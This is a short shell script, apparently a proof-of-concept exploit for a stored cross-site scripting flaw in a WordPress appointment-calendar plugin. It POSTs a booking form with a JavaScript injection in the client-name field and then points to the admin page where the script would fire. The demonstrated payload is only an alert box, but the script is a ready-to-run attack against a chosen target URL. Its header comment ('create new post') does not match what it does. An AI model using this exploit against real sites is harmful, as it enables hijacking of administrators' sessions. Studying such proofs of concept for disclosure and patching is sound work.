# create new post with [APCAL]

# https://wpvulndb.com/vulnerabilities/8633
# works for apcal ?

PAGE=$1

curl $PAGE -H 'Accept: text/html, */*; q=0.01' -H 'Accept-Language: en-US,en;q=0.5' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Host: localhost'  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0' -H 'X-Requested-With: XMLHttpRequest' --data 'ServiceId=1&AppDate=11-11-2016&StartTime=10:30 AM&Client_Name="%2Balert("hello")%2B"&Client_Email=test@test.com&Client_Phone=123456&Client_Note=&Service_Duration=30' 1>/dev/null 2>&1

echo "visit /wp-admin/admin.php?page=appointment-calendar"

